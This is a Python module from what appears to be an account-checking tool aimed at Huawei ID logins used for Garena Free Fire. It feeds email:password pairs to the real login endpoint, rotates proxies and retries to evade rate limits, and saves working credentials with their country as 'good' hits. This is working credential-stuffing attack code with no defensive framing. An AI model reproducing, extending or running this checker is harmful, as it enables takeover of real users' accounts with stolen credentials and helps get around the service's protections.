from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy, get_string
from requests import get,post

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        headers = {
            "Accept": "application/json, text/plain, */*" ,
            "Accept-Encoding": "gzip, deflate, br" ,
            "Accept-Language": "en-US,en;q=0.9,ar;q=0.8" ,
            "Connection": "keep-alive" ,
            "Content-Length": "1063" ,
            "Content-Type": "application/x-www-form-urlencoded" ,
            "Cookie": "JSESSIONID=4617BD52451B937CFE9D9D032623AA53240C1B88E5D67D87; VERSION_NO=UP_CAS_5.2.0.100; CAS_THEME_NAME=huawei" ,
            "Host": "id7.cloud.huawei.com" ,
            "Origin": "https://oauth-login.cloud.huawei.com" ,
            "Referer": "https://oauth-login.cloud.huawei.com/" ,
            "sec-ch-ua": "\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" ,
            "sec-ch-ua-mobile": "?0" ,
            "Sec-Fetch-Dest": "empty" ,
            "Sec-Fetch-Mode": "cors" ,
            "Sec-Fetch-Site": "same-site" ,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36" 
        }
        data = f"pageToken={get_string(64)}&pageTokenKey={get_string(64)}&loginUrl=https%3A%2F%2Fid7.cloud.huawei.com%3A443%2FCAS%2Fportal%2FloginAuth.html&service=https%3A%2F%2Foauth-login7.cloud.huawei.com%2Foauth2%2Fv2%2Flogin%3Fclient_id%3D100886055%26display%3Dpage%26flowID%3D1a87820c-7f65-4175-b728-71827da1cafd%26h%3D1617962729.5430%26lang%3Den-us%26redirect_uri%3Dhttps%253A%252F%252F100067.connect.garena.com%252Foauth%252Flogin%253Fresponse_type%253Dtoken%2526locale%253Dzh-TW%2526redirect_uri%253Dhttps%25253A%25252F%25252Freward.ff.garena.com%25252F%2526client_id%253D100067%2526all_platforms%253D1%2526platform%253D7%26response_type%3Dcode%26scope%3Dopenid%2Bhttps%253A%252F%252Fwww.huawei.com%252Fauth%252Faccount%252Fbase.profile%26v%3Da60d2237058821bae0939d3777d9de5f5552e2ad07d4fe0ee70babb3b3dd3644&loginChannel=90000300&reqClientType=90&lang=en-us&isThirdBind=0&hwmeta=&userAccount={email}&password={password}&clientID=100886055&languageCode=en-us"
        try:
            response = post('https://id7.cloud.huawei.com/CAS/IDM_W/ajaxHandler/remoteLogin?reflushCode=0.9373766246178068',headers=headers,data=data,proxies=proxy_set,timeout=Checker.timeout).text
            if "isSuccess\":0" in response:
                retries += 1
            elif "Current user need cross login" in response:
                Checker.custom += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("custom",email+":"+password,"Freefire")
                save("Freefire","custom",Checker.time,email+":"+password)
                return
            elif "isSuccess\":1" in response:
                country = response.split("countryCode=")[1].split("\",\"")[0]
                Checker.good += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("good",email+":"+password,"Freefire")
                save("Freefire","good",Checker.time,email+":"+password+f" | Country: {country}")
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return